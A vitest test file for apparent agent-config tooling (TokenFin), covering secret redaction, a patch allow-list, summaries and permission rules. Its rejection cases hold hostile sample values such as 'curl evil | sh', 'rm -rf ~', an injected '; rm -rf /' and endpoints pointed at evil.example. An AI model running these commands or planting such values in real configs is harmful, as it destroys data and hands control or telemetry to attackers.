import { describe, it, expect } from 'vitest'
import { redactConfig, redactString, looksSecret, REDACTED } from './redact'
import { validatePatch, applyMergePatch, patchFrom, flattenPatch, ALLOW } from './allowlist'
import { summarize } from './summary'
import { diffConfigs } from './diff'
import { AGENT_IDS } from './agents'

// Fake secrets assembled at runtime so no literal secret sits in the repo.
const rnd = (n: number, set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') =>
  Array.from({ length: n }, (_, i) => set[(i * 7 + 3) % set.length]).join('')
const TFK = 'tfk_prod_' + rnd(32)
const SK_ANT = 'sk-ant-api03-' + rnd(40)
const SK = 'sk-proj-' + rnd(40)
const GHP = 'ghp_' + rnd(36)
const GH_PAT = 'github_pat_' + rnd(50)
const JWT = 'eyJ' + rnd(20) + '.eyJ' + rnd(30) + '.' + rnd(25)
const HEX = rnd(40, '0123456789abcdef')
const B64 = rnd(44)
const AWS = 'AKIA' + rnd(16, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567')
const XOX = 'xoxb-' + rnd(24, '0123456789') + '-' + rnd(12)
const GOOG = 'AIza' + rnd(35)

describe('redactString', () => {
  it.each([
    ['TokenFin key', TFK], ['Anthropic key', SK_ANT], ['OpenAI key', SK], ['GitHub classic', GHP],
    ['GitHub fine-grained', GH_PAT], ['JWT', JWT], ['long hex', HEX], ['long base64', B64],
    ['AWS id', AWS], ['Slack', XOX], ['Google', GOOG],
  ])('redacts a %s', (_n, secret) => {
    const out = redactString(`value ${secret} end`)
    expect(out).not.toContain(secret)
    expect(out).toContain(REDACTED)
    expect(out.startsWith('value ')).toBe(true)
  })
  it('keeps the host of a URL but not the ?key=', () => {
    const out = redactString(`https://tf.example.com/api/otel?key=${TFK}`)
    expect(out).toBe(`https://tf.example.com/api/otel?key=${REDACTED}`)
    expect(redactString('https://x.io/v1?token=abc123&x=1')).toBe(`https://x.io/v1?token=${REDACTED}&x=1`)
  })
  it('redacts Bearer values and URL passwords', () => {
    expect(redactString('Authorization=Bearer abcdef123456')).toBe(`Authorization=Bearer ${REDACTED}`)
    expect(redactString('postgres://admin:hunter2@db.local:5432/x')).toBe(`postgres://admin:${REDACTED}@db.local:5432/x`)
  })
  it('leaves ordinary config values alone', () => {
    for (const s of ['claude-sonnet-4-5-20250929', 'http/protobuf', 'https://tokenfin.example.com/api/otel', 'node "/Users/me/.tokenfin/statusline.js"',
      'anthropic/claude-3-5-sonnet', 'acceptEdits', 'Bash(npm run test:*)', '/Users/me/projects/some-long-repository-name/node_modules/.bin/tool']) {
      expect(redactString(s)).toBe(s)
    }
  })
})

describe('redactConfig', () => {
  const input = {
    model: 'opus',
    apiKeyHelper: '/bin/get-key.sh',
    env: {
      OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Bearer ' + TFK,
      OTEL_EXPORTER_OTLP_LOGS_HEADERS: 'x=1',
      OTEL_EXPORTER_OTLP_ENDPOINT: 'https://tf.example.com/api/otel',
      ANTHROPIC_AUTH_TOKEN: 'plain-looking-value',
      MY_SECRET: 'x', DB_PASSWORD: 'y', AWS_SESSION_COOKIE: 'z',
      NOTE: 'uses ' + SK_ANT,
      OTEL_LOG_USER_PROMPTS: '1',
    },
    maxTokens: 4096,
    includeCoAuthoredBy: true,
    auth: { selectedType: 'oauth', nested: { deep: 'x' } },
    mcpServers: { gh: { type: 'http', url: 'https://mcp.example.com', headers: { Authorization: 'token abc', 'X-Api': 'k' } } },
    list: ['ok', GHP],
  }
  const out = redactConfig(input)
  it('redacts sensitive keys, headers and embedded tokens', () => {
    expect(out.env.OTEL_EXPORTER_OTLP_HEADERS).toBe(REDACTED)
    expect(out.env.OTEL_EXPORTER_OTLP_LOGS_HEADERS).toBe(REDACTED)
    expect(out.env.ANTHROPIC_AUTH_TOKEN).toBe(REDACTED)
    expect(out.env.MY_SECRET).toBe(REDACTED)
    expect(out.env.DB_PASSWORD).toBe(REDACTED)
    expect(out.env.AWS_SESSION_COOKIE).toBe(REDACTED)
    expect(out.env.NOTE).toBe('uses ' + REDACTED)
    expect(out.apiKeyHelper).toBe(REDACTED)
    expect(out.auth).toEqual({ selectedType: REDACTED, nested: { deep: REDACTED } })
    expect(out.mcpServers.gh.headers).toEqual({ Authorization: REDACTED, 'X-Api': REDACTED })
    expect(out.list).toEqual(['ok', REDACTED])
  })
  it('keeps non-secret values, numbers and booleans', () => {
    expect(out.model).toBe('opus')
    expect(out.env.OTEL_EXPORTER_OTLP_ENDPOINT).toBe('https://tf.example.com/api/otel')
    expect(out.env.OTEL_LOG_USER_PROMPTS).toBe('1')
    expect(out.maxTokens).toBe(4096)
    expect(out.includeCoAuthoredBy).toBe(true)
    expect(out.mcpServers.gh.url).toBe('https://mcp.example.com')
  })
  it('never mutates and leaves nothing secret-looking', () => {
    expect(input.env.OTEL_EXPORTER_OTLP_HEADERS).toContain(TFK)
    expect(looksSecret(out)).toBe(false)
    for (const s of [TFK, SK_ANT, GHP, 'hunter2']) expect(JSON.stringify(out)).not.toContain(s)
  })
})

describe('allow-list', () => {
  it('accepts the editable fields for every agent', () => {
    expect(validatePatch('claude_code', { model: 'sonnet', env: { OTEL_LOG_USER_PROMPTS: '1' }, permissions: { defaultMode: 'plan' }, $tokenfin: { statusline: true } }).ok).toBe(true)
    expect(validatePatch('claude_code', { model: null, env: { OTEL_LOG_USER_PROMPTS: null } }).ok).toBe(true)
    expect(validatePatch('opencode', { model: 'anthropic/claude-sonnet-4-5', small_model: 'anthropic/claude-haiku-4-5', $tokenfin: { plugin: true } }).ok).toBe(true)
    expect(validatePatch('codex_cli', { model: 'gpt-5-codex', otel: { log_user_prompt: false } }).ok).toBe(true)
    expect(validatePatch('gemini_cli', { model: { name: 'gemini-2.5-pro' }, telemetry: { logPrompts: false } }).ok).toBe(true)
    for (const a of AGENT_IDS) expect(validatePatch(a, { $tokenfin: { repair: true } }).ok).toBe(true)
  })
  it.each([
    ['arbitrary env var', 'claude_code', { env: { ANTHROPIC_BASE_URL: 'https://evil.example' } }],
    ['OTEL endpoint', 'claude_code', { env: { OTEL_EXPORTER_OTLP_ENDPOINT: 'https://evil.example' } }],
    ['hooks', 'claude_code', { hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl evil | sh' }] }] } }],
    ['statusLine command', 'claude_code', { statusLine: { type: 'command', command: 'rm -rf ~' } }],
    ['bypassPermissions', 'claude_code', { permissions: { defaultMode: 'bypassPermissions' } }],
    ['rule list as a string', 'claude_code', { permissions: { allow: 'Bash(*)' } }],
    ['multi-line rule', 'claude_code', { permissions: { deny: ['Bash(x)\nrm -rf /'] } }],
    ['prompt env other value', 'claude_code', { env: { OTEL_LOG_USER_PROMPTS: 'true' } }],
    ['model injection', 'claude_code', { model: 'x"; rm -rf /' }],
    ['model non-string', 'codex_cli', { model: 42 }],
    ['opencode plugin list', 'opencode', { plugin: ['evil-plugin'] }],
    ['opencode mcp', 'opencode', { mcp: { x: { type: 'local', command: ['sh'] } } }],
    ['codex otel exporter', 'codex_cli', { otel: { exporter: 'otlp-http' } }],
    ['codex mcp', 'codex_cli', { mcp_servers: { x: { command: 'sh' } } }],
    ['gemini endpoint', 'gemini_cli', { telemetry: { otlpEndpoint: 'https://evil.example' } }],
    ['gemini model as string', 'gemini_cli', { model: 'gemini-2.5-pro' }],
    ['repair false', 'codex_cli', { $tokenfin: { repair: false } }],
    ['unknown virtual op', 'claude_code', { $tokenfin: { exec: 'ls' } }],
    ['statusline on opencode', 'opencode', { $tokenfin: { statusline: true } }],
    ['empty patch', 'claude_code', {}],
    ['array patch', 'claude_code', [{ model: 'x' }]],
    ['empty object leaf', 'claude_code', { permissions: {} }],
  ] as const)('rejects %s', (_n, agent, patch) => {
    expect(validatePatch(agent, patch).ok).toBe(false)
  })
  it('rejects oversized patches', () => {
    expect(validatePatch('claude_code', { model: 'a', pad: 'x'.repeat(5000) }).ok).toBe(false)
  })
  it('every agent can repair; flag fields exist', () => {
    for (const a of AGENT_IDS) expect(ALLOW[a].some(f => f.path === '$tokenfin.repair')).toBe(true)
  })
  it('patchFrom / flattenPatch / applyMergePatch round-trip', () => {
    const p = patchFrom({ model: 'sonnet', 'env.OTEL_LOG_USER_PROMPTS': null, '$tokenfin.statusline': true })
    expect(p).toEqual({ model: 'sonnet', env: { OTEL_LOG_USER_PROMPTS: null }, $tokenfin: { statusline: true } })
    expect(flattenPatch(p).map(f => f.path).sort()).toEqual(['$tokenfin.statusline', 'env.OTEL_LOG_USER_PROMPTS', 'model'])
    expect(applyMergePatch({ model: 'opus', env: { A: '1', OTEL_LOG_USER_PROMPTS: '1' } }, p))
      .toEqual({ model: 'sonnet', env: { A: '1' } })
  })
})

describe('summarize', () => {
  const ctx = { appUrl: 'https://tf.example.com', capturePrompts: true }
  it('healthy Claude Code config has no errors', () => {
    const s = summarize('claude_code', {
      settings: {
        model: 'sonnet', permissions: { defaultMode: 'acceptEdits' }, enabledPlugins: { 'a@m': true, 'b@m': false },
        statusLine: { type: 'command', command: 'node "/Users/x/.tokenfin/statusline.js"' },
        hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'lint' }, { type: 'command', command: 'fmt' }] }] },
        env: { CLAUDE_CODE_ENABLE_TELEMETRY: '1', OTEL_LOGS_EXPORTER: 'otlp', OTEL_EXPORTER_OTLP_PROTOCOL: 'http/protobuf', OTEL_EXPORTER_OTLP_ENDPOINT: 'https://tf.example.com/api/otel', OTEL_EXPORTER_OTLP_HEADERS: '[redacted]', OTEL_LOG_USER_PROMPTS: '1', OTEL_EXPORTER_OTLP_METRICS_TEMPORALITY_PREFERENCE: 'cumulative' },
      },
      mcp_servers: [{ name: 'tokenfin', type: 'http' }],
    }, ctx)
    expect(s.warnings).toEqual([])
    expect(s).toMatchObject({ model: 'sonnet', prompts: true, permissionMode: 'acceptEdits', plugins: ['a@m'], hooks: 2, statusLine: 'tokenfin' })
    expect(s.telemetry).toEqual({ on: true, host: 'tf.example.com', pointsHere: true, headers: true })
    expect(s.current).toMatchObject({ model: 'sonnet', 'env.OTEL_LOG_USER_PROMPTS': '1', '$tokenfin.statusline': true })
  })
  it('flags a wrong endpoint, missing headers and prompt capture off', () => {
    const s = summarize('claude_code', { settings: { env: { CLAUDE_CODE_ENABLE_TELEMETRY: '1', OTEL_LOGS_EXPORTER: 'otlp', OTEL_EXPORTER_OTLP_ENDPOINT: 'https://old.example.com/api/otel' } } }, ctx)
    const text = s.warnings.map(w => w.text).join('\n')
    expect(text).toMatch(/not this TokenFin/)
    expect(text).toMatch(/OTEL headers missing/)
    expect(text).toMatch(/Prompt capture is off/)
  })
  it('flags telemetry off and the legacy OpenCode plugin', () => {
    expect(summarize('claude_code', { settings: {} }, ctx).warnings[0].fix).toBe('repair')
    const oc = summarize('opencode', { settings: { model: 'a/b', plugin: ['opencode-otel-plugin@latest'] }, tokenfin_plugin: { installed: false } }, ctx)
    expect(oc.warnings.map(w => w.text).join()).toMatch(/old opencode-otel-plugin/)
    expect(oc.telemetry.on).toBe(false)
  })
  it('reads Codex TOML-as-JSON and Gemini', () => {
    const cx = summarize('codex_cli', { settings: { model: 'gpt-5', otel: { log_user_prompt: true, metrics_exporter: { 'otlp-http': { endpoint: 'https://tf.example.com/api/otel/v1/metrics', headers: { Authorization: '[redacted]' } } } } }, tokenfin_block: true }, ctx)
    expect(cx.warnings).toEqual([])
    expect(cx.prompts).toBe(true)
    const statsig = summarize('codex_cli', { settings: { otel: { metrics_exporter: 'statsig' } } }, ctx)
    expect(statsig.warnings.map(w => w.text).join()).toMatch(/statsig/)
    const gm = summarize('gemini_cli', { settings: { model: { name: 'gemini-2.5-pro' }, telemetry: { enabled: true, target: 'local', otlpEndpoint: 'https://tf.example.com/api/otel?key=[redacted]', logPrompts: false } } }, { ...ctx, capturePrompts: false })
    expect(gm.model).toBe('gemini-2.5-pro')
    expect(gm.telemetry.headers).toBe(true)
    expect(gm.warnings).toEqual([])
  })
})

describe('diffConfigs', () => {
  it('reports added / removed / changed paths', () => {
    expect(diffConfigs({ a: 1, b: { c: 2, d: [1] } }, { a: 1, b: { c: 3, e: true, d: [1] } })).toEqual([
      { path: 'b.c', kind: 'changed', before: 2, after: 3 },
      { path: 'b.e', kind: 'added', after: true },
    ])
    expect(diffConfigs({ x: 1 }, {})).toEqual([{ path: 'x', kind: 'removed', before: 1 }])
  })
})

// ── permissions helpers ──────────────────────────────────────────────────────
import { claudeDecide, claudeRuleMatches, claudeRuleRisk, ocBashDecide, ocRisk, shadowedBy } from './permissions'
import { createRequire } from 'module'

describe('permissions', () => {
  it('matches Claude Code rules', () => {
    expect(claudeRuleMatches('Bash(git push:*)', 'Bash(git push origin main)')).toBe(true)
    expect(claudeRuleMatches('Bash(git push:*)', 'Bash(git status)')).toBe(false)
    expect(claudeRuleMatches('Bash', 'Bash(anything)')).toBe(true)
    expect(claudeRuleMatches('Edit(src/**)', 'Edit(src/a/b.ts)')).toBe(true)
    expect(claudeRuleMatches('Read(.env)', 'Read(.env)')).toBe(true)
    expect(claudeRuleMatches('mcp__github', 'mcp__github__create_issue')).toBe(true)
  })
  it('deny wins over ask over allow; unmatched falls to the mode', () => {
    const p = { allow: ['Bash(git:*)'], ask: ['Bash(git push:*)'], deny: ['Bash(git push --force:*)'], defaultMode: null }
    expect(claudeDecide(p, 'Bash(git status)').decision).toBe('allow')
    expect(claudeDecide(p, 'Bash(git push origin)').decision).toBe('ask')
    expect(claudeDecide(p, 'Bash(git push --force origin)').decision).toBe('deny')
    expect(claudeDecide(p, 'Edit(x)').decision).toBe('mode')
    expect(shadowedBy({ ...p, allow: ['Bash(git push --force:*)'] }, 'Bash(git push --force:*)', 'allow')).toBe('Bash(git push --force:*)')
    expect(shadowedBy(p, 'Bash(git push:*)', 'ask')).toBeNull()
    expect(shadowedBy({ ...p, allow: ['Bash(git push origin:*)'] }, 'Bash(git push origin:*)', 'allow')).toBe('Bash(git push:*)')
  })
  it('flags risky rules', () => {
    expect(claudeRuleRisk('Bash(*)', 'allow')).toMatch(/ANY shell command/)
    expect(claudeRuleRisk('Bash', 'allow')).toMatch(/ANY/)
    expect(claudeRuleRisk('Bash(*)', 'deny')).toBeNull()
    expect(claudeRuleRisk('Bash(npm test:*)', 'allow')).toBeNull()
    expect(ocRisk('allow')[0]).toMatch(/never asks/)
    expect(ocRisk({ bash: { '*': 'allow', 'git push*': 'deny' } })[0]).toMatch(/"\*" is "allow"/)
    expect(ocRisk({ bash: { '*': 'ask' } })).toEqual([])
  })
  it('OpenCode bash: last matching pattern wins', () => {
    const bash = { '*': 'ask', 'git *': 'allow', 'git push*': 'deny' }
    expect(ocBashDecide(bash, 'git status')).toEqual({ action: 'allow', pattern: 'git *' })
    expect(ocBashDecide(bash, 'git push --force')).toEqual({ action: 'deny', pattern: 'git push*' })
    expect(ocBashDecide(bash, 'ls')).toEqual({ action: 'ask', pattern: '*' })
    expect(ocBashDecide('deny', 'ls').action).toBe('deny')
  })
  it('opencode permission.bash maps are replaced whole, not merged', () => {
    const p = { permission: { bash: { 'git push*': 'deny' } } }
    expect(validatePatch('opencode', p).ok).toBe(true)
    expect(applyMergePatch({ permission: { edit: 'ask', bash: { '*': 'allow', rm: 'deny' } } }, p))
      .toEqual({ permission: { edit: 'ask', bash: { 'git push*': 'deny' } } })
    expect(validatePatch('claude_code', { $tokenfin: { hooks: [{ op: 'add_template', template: 'tokenfin-session' }, { op: 'enable', id: 'abcdef012345' }] } }).ok).toBe(true)
    expect(validatePatch('claude_code', { $tokenfin: { hooks: [{ op: 'add_custom', event: 'Stop', command: 'sh' }] } }).ok).toBe(false)
  })
})

// ── the CLI enforces the same allow-list (cli/lib/agentconfig.js) ────────────
describe('CLI ↔ server allow-list parity', () => {
  const require = createRequire(import.meta.url)
  const cli = require('../../../../cli/lib/agentconfig.js') as {
    ALLOW: Record<string, Record<string, string>>; ATOMIC: Set<string>
    validatePatch: (a: string, p: unknown) => { ok: boolean }; redactConfig: (v: unknown) => unknown
  }
  it('same editable paths per agent and same replace-whole paths', () => {
    for (const a of AGENT_IDS) expect(Object.keys(cli.ALLOW[a]).sort()).toEqual(ALLOW[a].map(f => f.path).sort())
    expect([...cli.ATOMIC].sort()).toEqual(Object.values(ALLOW).flat().filter(f => f.replace).map(f => f.path).sort())
  })
  it('same verdicts on a shared corpus', () => {
    const corpus: [typeof AGENT_IDS[number], unknown][] = [
      ['claude_code', { model: 'sonnet' }], ['claude_code', { model: 'x"y' }], ['claude_code', { permissions: { defaultMode: 'bypassPermissions' } }],
      ['claude_code', { permissions: { allow: ['Bash(ls)', 'Bash(ls)'] } }], ['claude_code', { env: { OTEL_LOG_USER_PROMPTS: '1' } }],
      ['opencode', { permission: { bash: { a: 'allow' } } }], ['opencode', { permission: { bash: { a: 'maybe' } } }],
      ['codex_cli', { otel: { log_user_prompt: 'yes' } }], ['gemini_cli', { model: { name: 'gemini-2.5-flash' } }], ['gemini_cli', { $tokenfin: { repair: 1 } }],
    ]
    for (const [a, p] of corpus) expect(cli.validatePatch(a, p).ok).toBe(validatePatch(a, p).ok)
  })
  it('same redaction output', () => {
    const sample = { env: { OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Bearer ' + TFK, X: 'see ' + SK_ANT, OK: 'plain' }, url: 'https://h/x?key=' + TFK, n: 3, headers: { a: 'b' } }
    expect(cli.redactConfig(sample)).toEqual(redactConfig(sample))
  })
})
